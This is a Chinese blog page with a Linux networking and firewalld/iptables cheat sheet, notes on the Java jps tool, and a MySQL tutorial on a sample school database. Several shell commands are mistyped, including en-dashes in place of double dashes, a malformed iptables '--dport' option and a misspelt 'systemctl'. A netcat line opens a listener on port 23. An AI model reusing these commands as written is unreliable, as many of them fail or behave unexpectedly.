<p>dhclient eth0 以dhcp模式启用 ‘eth0’ </p>
<p>route -n show routing table </p>
<p>route add -net 0/0 gw IP_Gateway configura default gateway </p>
<p>route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network ‘192.168.0.0/16’ </p>
<p>route del 0/0 gw IP_gateway remove static route </p>
<p>echo “1” &gt; /proc/sys/net/ipv4/ip_forward activate ip routing </p>
<p>hostname show hostname of system </p>
<p>host <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> lookup hostname to resolve name to ip address and viceversa</p>
<p>nslookup <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> lookup hostname to resolve name to ip address and viceversa</p>
<p>ip link show show link status of all interfaces </p>
<p>mii-tool eth0 show link status of ‘eth0’ </p>
<p>ethtool eth0 show statistics of network card ‘eth0’ </p>
<p>netstat -tup show all active network connections and their PID </p>
<p>netstat -tupl show all network services listening on the system and their PID </p>
<p>tcpdump tcp port 80 show all HTTP traffic </p>
<p>iwlist scan show wireless networks </p>
<p>iwconfig eth1 show configuration of a wireless network card </p>
<p>hostname show hostname </p>
<p>host <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> lookup hostname to resolve name to ip address and viceversa </p>
<p>nslookup <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> lookup hostname to resolve name to ip address and viceversa </p>
<p>whois <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> lookup on Whois database </p>
<h1 id="JPS工具"><a href="#JPS工具" class="headerlink" title="JPS工具"></a>JPS工具</h1><p>jps(Java Virtual Machine Process Status Tool)是JDK 1.5提供的一个显示当前所有java进程pid的命令，简单实用，非常适合在linux/unix平台上简单察看当前java进程的一些简单情况。</p>
<p>  我想很多人都是用过unix系统里的ps命令，这个命令主要是用来显示当前系统的进程情况，有哪些进程，及其 id。 jps 也是一样，它的作用是显示当前系统的java进程情况，及其id号。我们可以通过它来查看我们到底启动了几个java进程（因为每一个java程序都会独占一个java虚拟机实例），和他们的进程号（为下面几个程序做准备），并可通过opt来查看这些进程的详细启动参数。</p>
<p>   使用方法：在当前命令行下打 jps(需要JAVA_HOME，没有的话，到改程序的目录下打) 。</p>
<p>jps存放在JAVA_HOME/bin/jps，使用时为了方便请将JAVA_HOME/bin/加入到Path.</p>
<p>$&gt; jps</p>
<p>23991 Jps</p>
<p>23789 BossMain</p>
<p>23651 Resin</p>
<h1 id="比较常用的参数："><a href="#比较常用的参数：" class="headerlink" title="比较常用的参数："></a>比较常用的参数：</h1><p>-q 只显示pid，不显示class名称,jar文件名和传递给main 方法的参数</p>
<p>$&gt; jps -q</p>
<p>28680</p>
<p>23789</p>
<p>23651</p>
<p>-m 输出传递给main 方法的参数，在嵌入式jvm上可能是null</p>
<p>$&gt; jps -m</p>
<p>28715 Jps -m</p>
<p>23789 BossMain</p>
<p>23651 Resin -socketwait 32768 -stdout /data/aoxj/resin/log/stdout.log -stderr /data/aoxj/resin/log/stderr.log</p>
<p>-l 输出应用程序main class的完整package名 或者 应用程序的jar文件完整路径名</p>
<p>$&gt; jps -l</p>
<p>28729 sun.tools.jps.Jps</p>
<p>23789 com.asiainfo.aimc.bossbi.BossMain</p>
<p>23651 com.caucho.server.resin.Resin</p>
<p>-v 输出传递给JVM的参数</p>
<p>$&gt; jps -v</p>
<p>23789 BossMain</p>
<p>28802 Jps -Denv.class.path=/data/aoxj/bossbi/twsecurity/java/trustwork140.jar:/data/aoxj/bossbi/twsecurity/java/:/data/aoxj/bossbi/twsecurity/java/twcmcc.jar:/data/aoxj/jdk15/lib/rt.jar:/data/aoxj/jd</p>
<p>k15/lib/tools.jar -Dapplication.home=/data/aoxj/jdk15 -Xms8m</p>
<p>23651 Resin -Xss1m -Dresin.home=/data/aoxj/resin -Dserver.root=/data/aoxj/resin -Djava.util.logging.manager=com.caucho.log.LogManagerImpl -</p>
<p>Djavax.management.builder.initial=com.caucho.jmx.MBeanServerBuilderImpl</p>
<p>sudo jps看到的进程数量最全</p>
<p>jps 192.168.0.77</p>
<p>列出远程服务器192.168.0.77机器所有的jvm实例，采用rmi协议，默认连接端口为1099</p>
<p>（前提是远程服务器提供jstatd服务）</p>
<p>注：jps命令有个地方很不好，似乎只能显示当前用户的java进程，要显示其他用户的还是只能用unix/linux的ps命令。</p>
<p>转自：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yjd_hycf_space/p/7730690.html">https://www.cnblogs.com/yjd_hycf_space/p/7730690.html</a></p>
<p>详细情况请参考sun官方文档。</p>
<p><a target="_blank" rel="noopener" href="http://java.sun.com/j2se/1.7.0/docs/tooldocs/share/jps.html">http://java.sun.com/j2se/1.7.0/docs/tooldocs/share/jps.html</a></p>
<p>(2) 修改字体和字体大小:</p>
<p>cd /lib/kbd/consolefonts    //进入到有字体的目录</p>
<p>ls                     //查看所有字体</p>
<p>setfont lat4-16+          //设置所选字体，lat4-16+为一个字体名字</p>
<p>echo ‘setfont lat4-16+’ &gt;&gt; /etc/bashrc     //设置为开机默认</p>
<p>(3) 修改分辨率</p>
<p>首先打开一个文件：</p>
<p>vi /etc/default/grub</p>
<p>在倒数第2行的 GRUB_CMDLINE_LINUX参数中的末尾添加以下内容：</p>
<p>net.ifnames=0 vga=0x314</p>
<p>将上面的文件保存退出。 </p>
<p>执行下面的命令，重新生成目标文件：</p>
<p>grub2-mkconfig &gt; /boot/grub2/grub.cfg</p>
<p>显示 done完成后，重启系统后生效：</p>
<p>reboot</p>
<h1 id="Iptables-firewalld"><a href="#Iptables-firewalld" class="headerlink" title="Iptables / firewalld"></a>Iptables / firewalld</h1><p>Centos7默认安装了firewalld，如果没有安装的话，可以使用 yum install firewalld firewalld-config进行安装。</p>
<h2 id="1-启动防火墙"><a href="#1-启动防火墙" class="headerlink" title="1.启动防火墙"></a>1.启动防火墙</h2><p>systemctl start firewalld</p>
<h2 id="2-禁用防火墙"><a href="#2-禁用防火墙" class="headerlink" title="2.禁用防火墙"></a>2.禁用防火墙</h2><p>systemctl stop firewalld</p>
<h2 id="3-设置开机启动"><a href="#3-设置开机启动" class="headerlink" title="3.设置开机启动"></a>3.设置开机启动</h2><p>systemctl enable firewalld</p>
<h2 id="4-停止并禁用开机启动"><a href="#4-停止并禁用开机启动" class="headerlink" title="4.停止并禁用开机启动"></a>4.停止并禁用开机启动</h2><p>sytemctl disable firewalld</p>
<h2 id="5-重启防火墙"><a href="#5-重启防火墙" class="headerlink" title="5.重启防火墙"></a>5.重启防火墙</h2><p>systemctl restart firewalld</p>
<p>firewall-cmd –reload</p>
<h2 id="6-查看状态"><a href="#6-查看状态" class="headerlink" title="6.查看状态"></a>6.查看状态</h2><p>systemctl status firewalld或者 firewall-cmd –state</p>
<h2 id="7-查看版本"><a href="#7-查看版本" class="headerlink" title="7.查看版本"></a>7.查看版本</h2><p>firewall-cmd –version</p>
<h2 id="8-查看帮助"><a href="#8-查看帮助" class="headerlink" title="8.查看帮助"></a>8.查看帮助</h2><p>firewall-cmd –help</p>
<h2 id="9-查看区域信息"><a href="#9-查看区域信息" class="headerlink" title="9.查看区域信息"></a>9.查看区域信息</h2><p>firewall-cmd –get-active-zones</p>
<h2 id="10-查看指定接口所属区域信息"><a href="#10-查看指定接口所属区域信息" class="headerlink" title="10.查看指定接口所属区域信息"></a>10.查看指定接口所属区域信息</h2><p>firewall-cmd –get-zone-of-interface=eth0</p>
<h2 id="11-拒绝所有包"><a href="#11-拒绝所有包" class="headerlink" title="11.拒绝所有包"></a>11.拒绝所有包</h2><p>firewall-cmd –panic-on</p>
<h2 id="12-取消拒绝状态"><a href="#12-取消拒绝状态" class="headerlink" title="12.取消拒绝状态"></a>12.取消拒绝状态</h2><p>firewall-cmd –panic-off</p>
<h2 id="13-查看是否拒绝"><a href="#13-查看是否拒绝" class="headerlink" title="13.查看是否拒绝"></a>13.查看是否拒绝</h2><p>firewall-cmd –query-panic</p>
<h2 id="14-将接口添加到区域-默认接口都在public"><a href="#14-将接口添加到区域-默认接口都在public" class="headerlink" title="14.将接口添加到区域(默认接口都在public)"></a>14.将接口添加到区域(默认接口都在public)</h2><p>firewall-cmd –zone=public –add-interface=eth0(永久生效再加上 –permanent 然后reload防火墙)</p>
<h2 id="15-设置默认接口区域"><a href="#15-设置默认接口区域" class="headerlink" title="15.设置默认接口区域"></a>15.设置默认接口区域</h2><p>firewall-cmd –set-default-zone=public(立即生效，无需重启)</p>
<h2 id="16-更新防火墙规则"><a href="#16-更新防火墙规则" class="headerlink" title="16.更新防火墙规则"></a>16.更新防火墙规则</h2><p>firewall-cmd –reload或firewall-cmd –complete-reload(两者的区别就是第一个无需断开连接，就是firewalld特性之一动态</p>
<p>添加规则，第二个需要断开连接，类似重启服务)</p>
<h2 id="17-查看指定区域所有打开的端口"><a href="#17-查看指定区域所有打开的端口" class="headerlink" title="17.查看指定区域所有打开的端口"></a>17.查看指定区域所有打开的端口</h2><p>firewall-cmd –zone=public –list-ports</p>
<h2 id="18-在指定区域打开端口（记得重启防火墙）"><a href="#18-在指定区域打开端口（记得重启防火墙）" class="headerlink" title="18.在指定区域打开端口（记得重启防火墙）"></a>18.在指定区域打开端口（记得重启防火墙）</h2><p>firewall-cmd –zone=public –add-port=80/tcp(永久生效再加上 –permanent)</p>
<p>说明：</p>
<p>–zone 作用域</p>
<p>–add-port=8080/tcp 添加端口，格式为：端口/通讯协议</p>
<p>–permanent #永久生效，没有此参数重启后失效</p>
<p>一、查看哪些端口被打开 netstat -anp</p>
<p>二、关闭端口号:</p>
<p><code>iptables -A OUTPUT -p tcp - -dport 端口号-j DROP</code></p>
<p>1</p>
<p>三、打开端口号：</p>
<p><code>iptables -A INPUT -ptcp - -dport 端口号-j ACCEPT</code></p>
<p>1</p>
<p>四、保存设置</p>
<p>service iptables save</p>
<p>1</p>
<p>五、以下是linux打开端口命令的使用方法。</p>
<p>　　nc -lp 23 &amp;(打开23端口，即telnet)</p>
<p>　　netstat -an | grep 23 (查看是否打开23端口)</p>
<p>六、linux打开端口命令每一个打开的端口，都需要有相应的监听程序才可以</p>
<p>检查更新防火墙规则：</p>
<p>firewall-cmd –list-all</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/mysql%E6%95%B0%E6%8D%AE%E5%BA%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Private">
      <meta itemprop="description" content="程序语言记录">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PeacefulRace">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/17/mysql%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-title-link" itemprop="url">mysql数据库基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-28 14:24:33" itemprop="dateModified" datetime="2022-05-28T14:24:33+08:00">2022-05-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" itemprop="url" rel="index"><span itemprop="name">数据库</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>– 如果存在名为school的数据库就删除它</p>
<p>– DROP DATABASE IF EXISTS school;</p>
<h1 id="–-创建名为school的数据库并指定默认的字符集为utf-8和排序方式"><a href="#–-创建名为school的数据库并指定默认的字符集为utf-8和排序方式" class="headerlink" title="– 创建名为school的数据库并指定默认的字符集为utf-8和排序方式"></a>– 创建名为school的数据库并指定默认的字符集为utf-8和排序方式</h1><p>CREATE DATABASE school DEFAULT charset utf8 collate utf8_bin;</p>
<p>– 切换到school数据库</p>
<p>USE school;</p>
<p>– 如果存在就删除学生表</p>
<p>DROP TABLE</p>
<p>IF EXISTS tb_student;</p>
<h2 id="–-创建学生表"><a href="#–-创建学生表" class="headerlink" title="– 创建学生表"></a>– 创建学生表</h2><p>CREATE TABLE tb_student (</p>
<p>​    stuid INT NOT NULL COMMENT ‘学号’,</p>
<p>​    stuname VARCHAR (20) NOT NULL COMMENT ‘姓名’,</p>
<p>​    stusex bit DEFAULT 1 COMMENT ‘性别’,</p>
<p>​    stubirth date COMMENT ‘生日’,</p>
<p>​    stuaddr varchar(255) default ‘’ comment ‘籍贯’,</p>
<p>​    colid int not null comment ‘所属学院’,</p>
<p>​    PRIMARY KEY (stuid),</p>
<p>​    foreign key (colid) REFERENCES tb_college (colid)</p>
<p>);</p>
<h2 id="–-修改学生表"><a href="#–-修改学生表" class="headerlink" title="– 修改学生表"></a>– 修改学生表</h2><p>ALTER TABLE tb_student ADD COLUMN stuaddr VARCHAR (255);</p>
<p>– 同第21行</p>
<p>– ALTER TABLE tb_student CHANGE COLUMN stuaddr stuaddr VARCHAR (511);</p>
<p>ALTER TABLE tb_student DROP COLUMN stuaddr;</p>
<h2 id="–-向学生表插入数据"><a href="#–-向学生表插入数据" class="headerlink" title="– 向学生表插入数据"></a>– 向学生表插入数据</h2><p>INSERT INTO tb_student</p>
<p>VALUES</p>
<p>​    (</p>
<p>​       1001,</p>
<p>​       ‘张三丰’,</p>
<p>​       1,</p>
<p>​       ‘1982-2-2’,</p>
<p>​       ‘湖北十堰’,</p>
<p>​       1</p>
<p>​    );</p>
<p>INSERT INTO tb_student</p>
<p>VALUES</p>
<p>​    (</p>
<p>​       1002,</p>
<p>​       ‘张三丰’,</p>
<p>​       1,</p>
<p>​       ‘1982-2-2’,</p>
<p>​       ‘湖北十堰’,</p>
<p>​       3</p>
<p>​    );</p>
<p>INSERT INTO tb_student (stuid, stuname)</p>
<p>VALUES</p>
<p>​    (1003, ‘张翠山’);</p>
<p>INSERT INTO tb_student (stusex, stuid, stuname)</p>
<p>VALUES</p>
<p>​    (0, 1004, ‘殷素素’);</p>
<p>INSERT INTO tb_student (stusex, stuid, stuname)</p>
<p>VALUES</p>
<p>​    (DEFAULT, 1005, ‘杨逍’),</p>
<p>​    (1, 1006, ‘谢逊’),</p>
<p>​    (0, 1007, ‘杨不悔’);</p>
<p>INSERT INTO tb_student (stusex, stuid, stuname, stubirth, stuaddr)</p>
<p>VALUES</p>
<p>​    (0, 1008, ‘周芷若’, ‘1992-04-15’, ‘湖南长沙’),</p>
<p>​    (1, 1009, ‘范瑶’, ‘1990-03-20’, ‘湖北武汉’);</p>
<h2 id="–-截断表（删除全表）"><a href="#–-截断表（删除全表）" class="headerlink" title="– 截断表（删除全表）"></a>– 截断表（删除全表）</h2><p>– truncate table tb_student;</p>
<p>– 删除学号为1002的学生</p>
<p>delete from tb_student where stuid=1002;</p>
<p>– 删除所有女学生</p>
<p>– delete from tb_student where stusex=0;</p>
<h2 id="–-更新操作"><a href="#–-更新操作" class="headerlink" title="– 更新操作"></a>– 更新操作</h2><p>– update tb_student set stuaddr=’四川成都’ where stuid=1005 or stuid=1006;</p>
<p>update tb_student set stuaddr=’四川成都’ where stuid in (1005,1006);</p>
<p>update tb_student set stubirth=’1998-12-30’, stuaddr=’山西大同’ where stuid=1007;</p>
<p>– 创建学院表</p>
<p>create table tb_college</p>
<p>(</p>
<p>colid int auto_increment comment ‘编号’,</p>
<p>colname varchar(31) not null comment ‘名称’,</p>
<p>website varchar(1023) comment ‘网址’,</p>
<p>primary key (colid)</p>
<p>);</p>
<p>ALTER TABLE tb_college ADD COLUMN colmaster VARCHAR (255);</p>
<p>update tb_college set website=’<a target="_blank" rel="noopener" href="http://www.abc.com&/#39;">http://www.abc.com&#39;</a>, colmaster=’左冷禅’ where colid=1;</p>
<p>update tb_college set website=’<a target="_blank" rel="noopener" href="http://www.xyz.com&/#39;">http://www.xyz.com&#39;</a>, colmaster=’岳不群’ where colid=2;</p>
<p>update tb_college set website=’<a target="_blank" rel="noopener" href="http://www.foo.com&/#39;">http://www.foo.com&#39;</a>, colmaster=’风清扬’ where colid=3;</p>
<p>– 插入学院记录</p>
<p>– 实体：学生、学院</p>
<p>– 关系：属于</p>
<p>– 重数：多对一</p>
<p>insert into tb_college (colname) VALUES</p>
<p>(‘计算机学院’),</p>
<p>(‘外国语学院’),</p>
<p>(‘经济管理学院’);</p>
<p>– 同第22行</p>
<p>– alter table tb_student add column colid int;</p>
<h2 id="–-修改学生表添加外键约束-参照完整性"><a href="#–-修改学生表添加外键约束-参照完整性" class="headerlink" title="– 修改学生表添加外键约束(参照完整性)"></a>– 修改学生表添加外键约束(参照完整性)</h2><p>– 同第24行</p>
<p>– alter table tb_student add constraint fk_student_colid foreign key (colid) REFERENCES tb_college (colid);</p>
<p>– 删除外键约束</p>
<p>– alter table tb_student drop foreign key fk_student_colid;</p>
<p>– 没有定义外键约束名称时先查看该表信息再删除</p>
<p>SHOW CREATE TABLE tb_score;</p>
<p>alter table tb_score drop foreign key tb_score_ibfk_1;</p>
<p>– 添加外键约束时增加级联操作-restrict不允许操作-cascade级联操作-set null设置为null</p>
<p>– alter table tb_student add constraint fk_student_colid foreign key (colid) REFERENCES tb_college (colid) on delete cascade/restrict/set null on update cascade;</p>
<p>update tb_student set colid=1 where stuid between 1001 and 1006;</p>
<p>update tb_student set colid=2 where stuid in (1007, 1008);</p>
<p>update tb_student set colid=3 where stuid=1009;</p>
<p>– 创建教师表</p>
<p>create table tb_teacher</p>
<p>(</p>
<p>teaid int not null comment ‘工号’,</p>
<p>teaname varchar(20) not null comment ‘姓名’,</p>
<p>teatitle varchar(10) default ‘助教’ comment ‘职称’,</p>
<p>colid int not null comment ‘所属学院’,</p>
<p>PRIMARY key (teaid),</p>
<p>FOREIGN key (colid) REFERENCES tb_college (colid)</p>
<p>);</p>
<p>– 创建课程表</p>
<p>create table tb_course</p>
<p>(</p>
<p>couid int not null comment ‘编号’,</p>
<p>couname varchar(50) not null comment ‘名称’,</p>
<p>coucredit int not null comment ‘学分’,</p>
<p>teaid int not null comment ‘授课老师’,</p>
<p>PRIMARY key (couid),</p>
<p>FOREIGN key (teaid) REFERENCES tb_teacher (teaid)</p>
<p>);</p>
<p>– 创建选课记录表</p>
<p>create table tb_score</p>
<p>(</p>
<p>scid int auto_increment comment ‘选课记录编号’, ##创建自动增进编号需定义主键(primary key)</p>
<p>stuid int not null comment ‘选课学生’,</p>
<p>couid int not null comment ‘所选课程’,</p>
<p>scdate datetime comment ‘选课时间日期’,</p>
<p>scmark decimal(4,1) comment ‘考试成绩’,</p>
<p>primary key (scid),</p>
<p>foreign key (stuid) REFERENCES tb_student (stuid),</p>
<p>foreign key (couid) REFERENCES tb_course (couid)</p>
<p>);</p>
<p>ALTER TABLE tb_score drop COLUMN scid;</p>
<p>– 添加唯一性约束（一个学生选某个课程只能选一次）</p>
<p>alter table tb_score add CONSTRAINT uni_score_stuid_couid</p>
<p>unique (stuid,couid);</p>
<p>– 插入学院数据</p>
<p>– 同第98-111行</p>
<p>insert into tb_college</p>
<p>(colname, colmaster, website) VALUES</p>
<p>(‘计算机学院’,’左冷禅’,’<a target="_blank" rel="noopener" href="http://www.abc.com&/#39;">http://www.abc.com&#39;</a>),</p>
<p>(‘外国语学院’,’岳不群’,’<a target="_blank" rel="noopener" href="http://www.xyz.com&/#39;">http://www.xyz.com&#39;</a>),</p>
<p>(‘经济管理学院’,’风清扬’,’<a target="_blank" rel="noopener" href="http://www.foo.com&/#39;">http://www.foo.com&#39;</a>);</p>
<p>– 插入学生数据</p>
<p>insert into tb_student</p>
<p>(stuid,stuname,stusex,stubirth,stuaddr,colid) VALUES</p>
<p>(1010,’向问天’,1,’1990-03-04’,’四川成都’,1),</p>
<p>(1011,’任我行’,1,’1992-02-02’,’湖南长沙’,1);</p>
<p>update tb_student set stubirth=’1994-03-06’, stuaddr=’贵州贵阳’ where stuid=1003;</p>
<p>update tb_student set stubirth=’1989-06-06’, stuaddr=’广西南宁’ where stuid=1004;</p>
<p>update tb_student set stubirth=’1991-02-06’ where stuid=1005;</p>
<p>update tb_student set stubirth=’1992-02-02’ where stuid=1006;</p>
<p>– 插入教师数据</p>
<p>insert into tb_teacher</p>
<p>(teaid,teaname,teatitle,colid) VALUES</p>
<p>(1122,’张二丰’,’教授’,1),</p>
<p>(1133,’宋远桥’,’副教授’,1),</p>
<p>(1144,’杨元’,’副教授’,1),</p>
<p>(2255,’范苑’,’教授’,2),</p>
<p>(3366,’韦一笑’,’讲师’,3);</p>
<p>– 插入课程数据</p>
<p>insert into tb_course (couid,couname,coucredit,teaid) VALUES</p>
<p>(1111,’python程序设计’,3,1122),</p>
<p>(2222,’web前端开发’,2,1122),</p>
<p>(3333,’操作系统’,4,1122),</p>
<p>(4444,’计算机网络’,2,1133),</p>
<p>(5555,’编译原理’,4,1144),</p>
<p>(6666,’算法和数据结构’,3,1144),</p>
<p>(7777,’经贸法语’,3,2255),</p>
<p>(8888,’成本会计’,2,3366),</p>
<p>(9999,’审计’,3,3366);</p>
<p>SELECT VERSION();</p>
<p>SELECT NOW();</p>
<p>SELECT SYSDATE() from dual;</p>
<p>– 插入选课数据</p>
<p>insert into tb_score (stuid, couid, scdate, scmark) VALUES</p>
<p>– (1001,1111,now(),95),</p>
<p>– (1001,2222,now(),87.5),</p>
<p>(1001,3333,now(),100),</p>
<p>(1001,4444,now(),null),</p>
<p>(1001,6666,now(),100),</p>
<p>(1003,1111,now(),65),</p>
<p>(1003,5555,now(),42),</p>
<p>(1004,1111,now(),92.5),</p>
<p>(1004,4444,now(),78),</p>
<p>(1004,5555,now(),82.5),</p>
<p>(1007,1111,now(),78),</p>
<p>(1008,1111,now(),82),</p>
<p>(1007,7777,now(),65.5),</p>
<p>(1006,7777,now(),88),</p>
<p>(1006,9999,now(),70),</p>
<p>(1011,1111,now(),72.5),</p>
<p>(1011,8888,now(),93),</p>
<p>(1011,9999,now(),null);</p>
<h2 id="–-CRUD操作（增删改查）"><a href="#–-CRUD操作（增删改查）" class="headerlink" title="– CRUD操作（增删改查）"></a>– CRUD操作（增删改查）</h2><p>– 查询所有学生信息</p>
<p>SELECT * from tb_student;</p>
<p>– 查询所有课程名称及学分（投影和别名）</p>
<p>SELECT couname, coucredit from tb_course;</p>
<p>– alias 别名：as ..</p>
<p>SELECT couname as 课程名称, coucredit as 学分 from tb_course;</p>
<p>SELECT stuname as 姓名, case stusex when 1 then ‘男’ else ‘女’ end as 性别 from tb_student;</p>
<p>SELECT stuname as 姓名, if(stusex, ‘男’,’女’) as 性别 from tb_student;</p>
<p>– 查询所有女学生的姓名和出生日期（筛选）</p>
<p>SELECT stuname, stubirth from tb_student where stusex=0;</p>
<p>– 查询所有80后学生的姓名、性别和出生日期（筛选）</p>
<p>SELECT stuname, stusex, stubirth from tb_student where stubirth&gt;=’1980-1-1’ and stubirth&lt;=’1989-12-31’;</p>
<p>SELECT stuname, stusex, stubirth from tb_student where stubirth between ‘1980-1-1’ and ‘1989-12-31’;</p>
<p>– 查询姓’杨‘的学生姓名和性别（模糊）</p>
<p>SELECT stuname, stusex from tb_student WHERE stuname like ‘杨%’;</p>
<p>– 查询姓’杨‘名字两个字的学生姓名和性别（模糊）</p>
<p>SELECT stuname, stusex from tb_student WHERE stuname like ‘杨_’;</p>
<p>– 查询姓’杨‘名字三个字的学生姓名和性别（模糊）</p>
<p>SELECT stuname, stusex from tb_student WHERE stuname like ‘杨__’;</p>
<p>– 查询名字中有’不‘字或’芷‘字的学生的姓名（模糊）</p>
<p>SELECT stuname from tb_student where stuname like ‘%不%’ or stuname like ‘%芷%’;</p>
<p>– 查询没有录入家庭住址的学生姓名（空值）</p>
<p>SELECT stuname from tb_student where stuaddr is null;</p>
<p>– 查询录入了家庭住址的学生姓名（空值）</p>
<p>SELECT stuname from tb_student where stuaddr is not null;</p>
<p>– 查询学生选课的所有日期（去重）</p>
<p>SELECT DISTINCT scdate from tb_score;</p>
<p>– 查询学生的家庭住址（去重）</p>
<p>SELECT DISTINCT stuaddr from tb_student where stuaddr is not null;</p>
<p>– 查询男学生的姓名和生日按年龄从大到小排序（排序）</p>
<p>– asc - ascending - 升序（从小到大）</p>
<p>– desc - descending - 降序（从大到小）</p>
<p>SELECT stuname, year(NOW()) - year(stubirth) as 年龄 from tb_student where stusex=1 ORDER BY 年龄 desc;</p>
<p>– 聚合函数 max / min / count / sum / avg (忽略空值)</p>
<p>– 查询年龄最大的学生的出生日期（聚合函数）</p>
<p>SELECT min(stubirth) from tb_student;</p>
<p>– 查询年龄最小的学生的出生日期（聚合函数）</p>
<p>SELECT max(stubirth) from tb_student;</p>
<p>– 查询男女学生的人数（分组和聚合函数）</p>
<p>SELECT count(stuid) from tb_student;</p>
<p>SELECT stusex, count(*) from tb_student group by stusex;</p>
<p>SELECT stusex, min(stubirth) from tb_student group by stusex;</p>
<p>– 查询课程编号为1111的课程的平均成绩（筛选和聚合函数）</p>
<p>SELECT avg(scmark) from tb_score where couid=1111;</p>
<p>SELECT min(scmark) from tb_score where couid=1111;</p>
<p>SELECT count(scmark) from tb_score where couid=1111;</p>
<p>SELECT count(scid) from tb_score where couid=1111;</p>
<p>– 查询学号为1001的学生所有课程的平均分（筛选和聚合函数）</p>
<p>SELECT avg(scmark) from tb_score where stuid=1001;</p>
<p>– 查询每个学生的学号和平均成绩（分组和聚合函数）</p>
<p>SELECT stuid, avg(scmark) from tb_score group by stuid;</p>
<p>– 查询平均成绩大于等于90分的学生的学号和平均成绩</p>
<p>– 分组以前的筛选使用where子句，分组以后的筛选使用having子句</p>
<p>SELECT stuid, avg(scmark) as 平均分 from tb_score group by stuid HAVING 平均分&gt;=90;</p>
<p>– 查询年龄最大的学生的姓名（子查询/嵌套查询）</p>
<p>SELECT stuname from tb_student where stubirth=(</p>
<p>SELECT min(stubirth) from tb_student);</p>
<p>– 查询年龄最大的学生的姓名和年龄（子查询+运算）</p>
<p>SELECT stuname,year(now())-year(stubirth) as 年龄 from tb_student where stubirth=(</p>
<p>SELECT min(stubirth) from tb_student);</p>
<p>– 查询选了两门以上的课程的学生姓名（子查询/分组条件/集合运算）</p>
<p>SELECT stuname from tb_student where stuid in (</p>
<p>SELECT stuid from tb_score GROUP BY stuid having count(stuid)&gt;2);</p>
<p>– 查询学生姓名、课程名称以及成绩（连接查询）</p>
<p>– 笛卡尔积</p>
<p>SELECT stuname, couname,scmark from tb_student t1,tb_course t2,tb_score t3 </p>
<p>where t1.stuid=t3.stuid and t2.couid=t3.couid and scmark is not null;</p>
<p>SELECT stuname, couname,scmark from tb_student t1 inner join tb_score t3 on t1.stuid=t3.stuid inner join tb_course t2 on t2.couid=t3.couid where scmark is not null order by scmark desc limit 5 offset 10;</p>
<p>– 分页查询（limit 5 offset 10 / limit 10,5）：跳过10条信息查询5条信息</p>
<p>SELECT stuname, couname,scmark from tb_student t1 inner join tb_score t3 on t1.stuid=t3.stuid inner join tb_course t2 on t2.couid=t3.couid where scmark is not null order by scmark desc limit 10,5;</p>
<p>– 单表：65535TB</p>
<p>– 单列：4G - LONGBLOB(Binary Large OBject) / LONGTEXT</p>
<p>– 查询选课学生的姓名和平均成绩（子查询和连接查询）</p>
<p>select stuname,avgmark from tb_student t1,</p>
<p>(SELECT stuid, avg(scmark) as avgmark from tb_score group by stuid) t2 where t1.stuid=t2.stuid;</p>
<p>– 内连接（inner join）</p>
<p>select stuname,avgmark from tb_student t1 inner join</p>
<p>(SELECT stuid, avg(scmark) as avgmark from tb_score group by stuid) t2 on t1.stuid=t2.stuid;</p>
<p>– 外连接（outer join）：左外连接-left outer join/右外连接-right outer join/全外连接-full outer join</p>
<p>– 查询每个学生的姓名和选课数量（左外连接和子查询）</p>
<p>– 左外连接：对left outer join关键词左边的查询结果（左表）做完全查询，即使不满足附加条件</p>
<p>SELECT stuname, ifnull(total,0) from tb_student t1 left outer join</p>
<p>(SELECT stuid,count(stuid) as total from tb_score group by stuid) t2 on t1.stuid=t2.stuid;</p>
<h2 id="–-注意事项"><a href="#–-注意事项" class="headerlink" title="– 注意事项"></a>– 注意事项</h2><p>– 1. 给数据库和表命名的时候尽量使用全小写</p>
<p>– 2. 作为筛选条件的字符串是否区分大小写看设置的校对规则</p>
<p>– select … where name = ‘jack’;</p>
<p>– CREATE DATABASE school DEFAULT charset utf8 collate utf8_general_ci;</p>
<p>– 3. 数据库中的对象通常会用前缀加以区分</p>
<p>– table/view/index/function/procedure/trigger</p>
<p>– 4. 向表中添加列并指定位置</p>
<p>– ALTER TABLE tb_college ADD COLUMN colmaster VARCHAR (255) after/first colname;</p>
<p>– 5. 通常不推荐使用in或者not in集合运算和distinct去重操作，可以用exists或not exists替代掉集合运算和去重操作。</p>
<p>– 查询姓’杨‘的学生（模糊）</p>
<p>– SELECT ‘x’ from dual where exists (select * from tb_student WHERE stuname like ‘杨%’);</p>
<p>– SELECT ‘x’ from dual where exists (select stuid from tb_student WHERE stuname like ‘李%’);</p>
<p>– 6. 生成执行计划explain判断性能和效率（正向查询，主键查询）</p>
<p>– SELECT stuname, stuid from tb_student where stuid=1001;</p>
